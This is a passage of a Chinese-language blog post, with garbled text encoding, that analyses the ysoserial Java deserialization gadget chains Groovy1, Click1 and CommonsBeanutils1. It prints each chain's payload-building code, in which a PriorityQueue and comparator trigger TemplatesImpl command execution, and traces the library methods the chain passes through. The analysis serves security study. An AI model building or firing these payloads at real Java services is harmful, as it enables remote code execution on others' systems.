class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> ((Closure) getDelegate()).call(args);<span class="comment">//ä¼ å…¥çš„æ˜¯MethodClosure</span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                ConversionHandler.invoke()</span><br><span class="line">                    ConvertedClosure.invokeCustom()</span><br><span class="line">    MethodClosure.call()</span><br><span class="line">    ...</span><br><span class="line">      Method.invoke()</span><br><span class="line">    Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/A6MvdZRs8qPpF3Y.png" ><p>ysoserial.payloads.Groovy1#getObject é¦–é€‰åˆ©ç”¨ MethodClosure æ‰¿è½½è¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œç„¶åæ„é€  ConvertedClosureï¼Œå†ç”¨äºå®ä¾‹åŒ– AnnotationInvocationHandler ä»£ç†ï¼Œæœ€åè¿”å›çš„æ˜¯ä»£ç†å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// MethodClosure -&gt; çˆ¶ç±» ConversionHandler.delegate</span></span><br><span class="line">    <span class="comment">// &quot;entrySet&quot; -&gt; ConvertedClosure.methodName</span></span><br><span class="line"><span class="keyword">final</span> ConvertedClosure closure = <span class="keyword">new</span> ConvertedClosure(<span class="keyword">new</span> MethodClosure(command, <span class="string">&quot;execute&quot;</span>), <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ ConvertedClosure åˆ›å»º Map ç±»å‹çš„ä»£ç†å¯¹è±¡</span></span><br><span class="line"><span class="keyword">final</span> Map map = Gadgets.createProxy(closure, Map.class);</span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„æœºåˆ¶åˆ›å»º AnnotationInvocationHandler ä»£ç†ï¼Œå°† map ä¿å­˜åˆ° memberValues å±æ€§ä¸­</span></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Click1"><a href="#Click1" class="headerlink" title="Click1"></a>Click1</h2><blockquote><p>Web åº”ç”¨æ¡†æ¶<br>å’Œ CC2 ç±»ä¼¼æ€è·¯</p><ul><li>åˆ©ç”¨ TemplatesImpl æ‰¿è½½æ¶æ„è°ƒç”¨é“¾</li><li>PriorityQueue åœ¨ååºåˆ—åŒ–æ—¶æ¯”è¾ƒå…ƒç´ ï¼ˆæ¢å¤é¡ºåºï¼‰ï¼Œè€Œæ¯”è¾ƒæ“ä½œå¯ä»¥è‡ªå®šä¹‰<br>è¿™é‡Œä½¿ç”¨ Column$ColumnComparator#compare æ–¹æ³•</li></ul></blockquote><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">      PriorityQueue.heapify()</span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">          PriorityQueue.siftDownUsingComparator()</span><br><span class="line">            Column$ColumnComparator.compare()</span><br><span class="line">                Column.getProperty()</span><br><span class="line">                  PropertyUtils.getValue()</span><br><span class="line">                    PropertyUtils.getObjectPropertyValue()</span><br><span class="line">                      Method.invoke()</span><br><span class="line">                        TemplatesImpl.getOutputProperties()</span><br><span class="line">                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/dpkRxuNwU34JQzn.png" ><p>TemplatesImpl ç±»ä¸»è¦çš„ä½œç”¨ä¸ºï¼š</p><ul><li>ä½¿ç”¨ <code>_bytecodes</code> æˆå‘˜å˜é‡å­˜å‚¨æ¶æ„å­—èŠ‚ç  ( æ¶æ„ class -&gt; byte array )</li><li>æä¾›åŠ è½½æ¶æ„å­—èŠ‚ç å¹¶è§¦å‘æ‰§è¡Œçš„å‡½æ•°ï¼ŒåŠ è½½åœ¨ <code>defineTransletClasses()</code> æ–¹æ³•ä¸­ï¼Œæ–¹æ³•è§¦å‘ä¸º <code>getOutputProperties()</code> æˆ– <code>newTransformer()</code></li></ul><p>PriorityQueue ååºåˆ—åŒ–æ—¶æœ€åä¼šè°ƒç”¨ <code>heapify -&gt; siftDown</code>ï¼ˆå°†æ— åºé˜Ÿåˆ—è¿˜åŸä¸ºä¼˜å…ˆé˜Ÿåˆ—ï¼‰ï¼Œå½“ comparator ä¸ä¸ºç©ºæ—¶è¿›ä¸€æ­¥è°ƒç”¨ <code>siftDownUsingComparator -&gt; conparator.compare</code>ï¼Œç„¶åé€šè¿‡è°ƒç”¨ Column.getProperty è¿›ä¸€æ­¥è§¦å‘ TemplatesImpl.getOutputProperties</p><p>ysoserial.payloads.Click1#getObject åˆ›å»º Column$ColumnComparator æ¯”è¾ƒå™¨ï¼Œä½œä¸º PriorityQueue çš„å‚æ•°ï¼›å…ˆè®¾ç½®æ­£å¸¸çš„å˜é‡å€¼ï¼Œç„¶åè®¾ç½® Column çš„ name å˜é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// prepare a Column.comparator with mock values</span></span><br><span class="line">    <span class="keyword">final</span> Column column = <span class="keyword">new</span> Column(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line">    column.setTable(<span class="keyword">new</span> Table());</span><br><span class="line">    Comparator comparator = (Comparator) Reflections.newInstance(<span class="string">&quot;org.apache.click.control.Column$ColumnComparator&quot;</span>, column);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// create queue with numbers and our comparator</span></span><br><span class="line">    <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// stub data for replacement later</span></span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// switch method called by the comparator,</span></span><br><span class="line">    <span class="comment">// so it will trigger getOutputProperties() when objects in the queue are compared</span></span><br><span class="line">    column.setName(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// finally, we inject and new TemplatesImpl object into the queue,</span></span><br><span class="line">    <span class="comment">// so its getOutputProperties() method will be called</span></span><br><span class="line">    <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">    queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Column$ColumnComparator.compare æ–¹æ³•ï¼Œå…¶ä¸­ row1 ä¸ºæ¶æ„ TemplatesImpl å¯¹è±¡ï¼Œrow2 ä¸º <code>BigInteger(&quot;1&quot;)</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object row1, Object row2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.ascendingSort = <span class="keyword">this</span>.column.getTable().isSortedAscending() ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    Object value1 = <span class="keyword">this</span>.column.getProperty(row1); <span class="comment">// è¿™é‡Œ</span></span><br><span class="line">    Object value2 = <span class="keyword">this</span>.column.getProperty(row2);</span><br><span class="line">    <span class="keyword">if</span> (value1 <span class="keyword">instanceof</span> Comparable &amp;&amp; value2 <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">        <span class="keyword">return</span> !(value1 <span class="keyword">instanceof</span> String) &amp;&amp; !(value2 <span class="keyword">instanceof</span> String) ? ((Comparable)value1).compareTo(value2) * <span class="keyword">this</span>.ascendingSort : <span class="keyword">this</span>.stringCompare(value1, value2) * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value1 != <span class="keyword">null</span> &amp;&amp; value2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value1.toString().compareToIgnoreCase(value2.toString()) * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value1 != <span class="keyword">null</span> &amp;&amp; value2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value1 == <span class="keyword">null</span> &amp;&amp; value2 != <span class="keyword">null</span> ? -<span class="number">1</span> * <span class="keyword">this</span>.ascendingSort : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ this.column.getProperty(row1)ï¼Œå…¶ä¸­ï¼Œè°ƒç”¨ this.getName() è·å– Column çš„ name å±æ€§ï¼Œå¹¶è°ƒç”¨ this.getProperty(name, row)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(Object row)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getProperty(<span class="keyword">this</span>.getName(), row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¼ å…¥çš„ TemplatesImpl å¯¹è±¡ä¸æ˜¯ Map çš„å­ç±»ï¼Œç›´æ¥è·³è¿‡ if åˆ¤æ–­ï¼Œåœ¨ä¸º methodCache å±æ€§åˆå§‹åŒ– HashMap ç±»å‹å¯¹è±¡åï¼Œè°ƒç”¨ PropertyUtils.getValue(row, name, this.methodCache) æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(String name, Object row)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (row <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        Map map = (Map)row;</span><br><span class="line">        Object object = map.get(name);</span><br><span class="line">        <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String upperCaseName = name.toUpperCase();</span><br><span class="line">            object = map.get(upperCaseName);</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String lowerCaseName = name.toLowerCase();</span><br><span class="line">                object = map.get(lowerCaseName);</span><br><span class="line">                <span class="keyword">return</span> object != <span class="keyword">null</span> ? object : <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// ç›´æ¥æ‰§è¡Œè¿™é‡Œ</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.methodCache == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.methodCache = <span class="keyword">new</span> HashMap();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> PropertyUtils.getValue(row, name, <span class="keyword">this</span>.methodCache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†ä¼ å…¥çš„ name å‚æ•°å€¼èµ‹ç»™ basePart å˜é‡ï¼Œå¹¶åœ¨è°ƒç”¨ getObjectPropertyValue æ–¹æ³•æ—¶ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getValue</span><span class="params">(Object source, String name, Map cache)</span> </span>&#123;</span><br><span class="line">    String basePart = name;</span><br><span class="line">    String remainingPart = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (source <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Map)source).get(name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> baseIndex = name.indexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (baseIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">            basePart = name.substring(<span class="number">0</span>, baseIndex);</span><br><span class="line">            remainingPart = name.substring(baseIndex + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        Object value = getObjectPropertyValue(source, basePart, cache);  # è¿™é‡Œ</span><br><span class="line">        <span class="keyword">return</span> remainingPart != <span class="keyword">null</span> &amp;&amp; value != <span class="keyword">null</span> ? getValue(value, remainingPart, cache) : value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cache æ˜¯åˆå§‹åŒ–çš„ HashMap å¯¹è±¡ï¼Œæ‰€ä»¥ä»ä¸­è·å–ä¸åˆ°ä»»ä½•ç¼“å­˜æ–¹æ³•ï¼Œå› æ­¤ä¼šè°ƒç”¨ source.getClass().getMethod(ClickUtils.toGetterName(name)) æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getObjectPropertyValue</span><span class="params">(Object source, String name, Map cache)</span> </span>&#123;</span><br><span class="line">    PropertyUtils.CacheKey methodNameKey = <span class="keyword">new</span> PropertyUtils.CacheKey(source, name);</span><br><span class="line">    Method method = <span class="keyword">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        method = (Method)cache.get(methodNameKey);</span><br><span class="line">        <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">            method = source.getClass().getMethod(ClickUtils.toGetterName(name));    <span class="comment">// è¿™é‡Œ</span></span><br><span class="line">            cache.put(methodNameKey, method);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var13) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method = source.getClass().getMethod(ClickUtils.toIsGetterName(name));</span><br><span class="line">            cache.put(methodNameKey, method);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var11) &#123;</span><br><span class="line">            String msg;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = source.getClass().getMethod(name);</span><br><span class="line">                cache.put(methodNameKey, method);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var9) &#123;</span><br><span class="line">                msg = <span class="string">&quot;No matching getter method found for property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on class &quot;</span> + source.getClass().getName();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">            String msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">        String msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var14);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æ˜¯ä¸ºä¼ å…¥çš„ property å±æ€§å¤´éƒ¨æ·»åŠ  <code>get</code> ä¸‰ä¸ªå­—ç¬¦å†è¿”å›ï¼Œå› æ­¤å›åˆ° getObjectPropertyValue æ–¹æ³•ä¸­è°ƒç”¨method.invoke(source) æ–¹æ³•æ—¶ï¼Œmethod å‚æ•°å€¼å¯¹åº”çš„æ˜¯ â€œgetâ€ + ä¼ å…¥çš„ name å˜é‡ã€‚</p><p>è€Œè¿™é‡Œ name å˜é‡å€¼æ˜¯ç”± Column#name å±æ€§å€¼å†³å®šçš„ï¼Œå› æ­¤æ§åˆ¶ Column#name å±æ€§å€¼å°±å¯ä»¥è°ƒç”¨ä»»æ„ç±»ä¸­ä»¥ <code>get</code> å¼€å¤´çš„æ— å‚æ–¹æ³•ã€‚å¯ä»¥ç›´æ¥é€šè¿‡æ„é€ å‡½æ•°æ§åˆ¶ Column#name å±æ€§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toGetterName</span><span class="params">(String property)</span> </span>&#123;</span><br><span class="line">    HtmlStringBuffer buffer = <span class="keyword">new</span> HtmlStringBuffer(property.length() + <span class="number">3</span>);</span><br><span class="line">    buffer.append(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">    buffer.append(Character.toUpperCase(property.charAt(<span class="number">0</span>)));</span><br><span class="line">    buffer.append(property.substring(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><blockquote><p>æ€è·¯åŒ CC2ã€Click1<br>æ”¹ç”¨ BeanComparator ä½œä¸ºæ¯”è¾ƒå™¨</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-beanutils:1.9.2</li><li>commons-collections:3.1</li><li>commons-logging:1.2</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">      PriorityQueue.heapify()</span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">          PriorityQueue.siftDownUsingComparator()</span><br><span class="line">            BeanComparator.compare()</span><br><span class="line">                PropertyUtils.getProperty()</span><br><span class="line">                    PropertyUtilsBean.getProperty()</span><br><span class="line">                        PropertyUtilsBean.getNestedProperty()</span><br><span class="line">                            PropertyUtilsBean.getSimpleProperty()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/OAfq1WD6UhIbRQv.png" ><p>ysoserial.payloads.CommonsCollections7#getObject å’Œ CC2 åŸºæœ¬ç›¸åŒï¼Œä¸­é—´ä½¿ç”¨ BeanComparator ä½œä¸ºæ¯”è¾ƒå™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ‰¿è½½æ¶æ„ä»£ç </span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¯”è¾ƒå™¨</span></span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºä¼˜å…ˆé˜Ÿåˆ—</span></span><br><span class="line">    <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®æ¯”è¾ƒå™¨è°ƒç”¨ getoutputProperties æ–¹æ³•</span></span><br><span class="line">    <span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ›¿æ¢é˜Ÿåˆ—ä¸­çš„æ•°æ®</span></span><br><span class="line">    <span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BeanComparator#compare æ–¹æ³•ä¸­è°ƒç”¨äº† PropertyUtils.getProperty è·å–å±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.property == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.internalCompare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, <span class="keyword">this</span>.property);   <span class="comment">// è¿™é‡Œ</span></span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, <span class="keyword">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.internalCompare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    